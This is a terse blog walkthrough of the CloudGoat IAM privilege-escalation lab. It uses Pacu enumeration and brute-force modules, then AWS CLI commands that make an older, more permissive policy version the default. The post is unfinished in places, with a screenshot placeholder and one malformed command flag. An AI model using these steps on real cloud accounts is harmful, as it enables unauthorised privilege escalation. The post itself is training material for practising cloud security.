---
layout: post
title: CloudGoat iam_privesc_by_rollback
date:   2019-09-23 12:00:00
categories: howto
permalink: "/howto/cloudgoat/iam-privesc-by-rollback"
---

For this event we’ll start by leveraging the Pacu tool to do some basic account enumeration:
```
run iam__enum_account
```

Looks like we don’t have enough permission
```
iam__bruteforce_permissions
iam__enum_users_roles_policies_groups
```

Then within pacu we can run the ‘Data’ command to see information associated with the findings. Looks like there is a specific policy listed for our user account

aws iam list-policy-versions --policy-arn arn:aws:iam::944882903810:policy/cg-raynor-policy

Notice default version is 1

#Screenshot here

```
aws iam get-policy-version --policy arn:aws:iam::944882903810:policy/cg-raynor-policy --version-id v3
```

Notice version

```
aws iam set-default-policy-version --policy arn:aws:iam::944882903810:policy/cg-raynor-policy --version-id v3
```

Now run the list policy versions command, notice default is now 3

```
aws iam list-policy-versions --policy-arn arn:aws:iam::944882903810:policy/cg-raynor-policy
```

And we can now run aws__enum_account